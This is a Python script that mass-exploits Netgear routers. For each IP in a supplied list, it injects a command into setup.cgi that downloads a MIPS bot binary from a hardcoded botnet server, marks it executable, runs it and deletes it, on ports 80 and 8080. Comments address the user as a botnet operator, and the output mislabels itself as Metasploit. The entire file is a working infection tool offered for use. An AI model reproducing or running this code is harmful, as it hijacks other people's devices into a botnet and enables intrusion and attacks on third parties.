#usr/bin/python
import threading, sys, time, re, os, requests
if len(sys.argv) < 2:
    print "\033[37mUsage: python "+sys.argv[0]+" list of ips \033[37m"
    sys.exit()

server = "173.244.221.9" # YOUR BOTNETS IP 
location = "/var/www/html/mips" # Location in HTTP server
mips = "m-i.p-s.ISIS" # Name of your mips bin
ips = open(sys.argv[1], "r").readlines()
class netgear(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print("\033[37m[\033[36mMETASPLOIT\033[37m] Trying \033[36m-> \033[37m%s") % (self.ip)
				payload = "http://" +self.ip +"/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://"+server+"/"+location+"%20-O%20/var/tmp/"+mips+";%20chmod%20777%20/var/tmp/"+mips+";%20/var/tmp/"+mips+";%20rm%20-rf%20/var/tmp/"+mips+"&curpath=/&currentsetting.htm=1"
				payload1 = "http://" +self.ip +":8080/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://"+server+"/"+location+"%20-O%20/var/tmp/"+mips+";%20chmod%20777%20/var/tmp/"+mips+";%20/var/tmp/"+mips+";%20rm%20-rf%20/var/tmp/"+mips+"&curpath=/&currentsetting.htm=1" 
				requests.get(payload, timeout=5)
				requests.get(payload1, timeout=5)
        		except:
            		    pass
 
for ip in ips:
	try:
		kaden = netgear(ip)
		kaden.start()
	except:
		pass
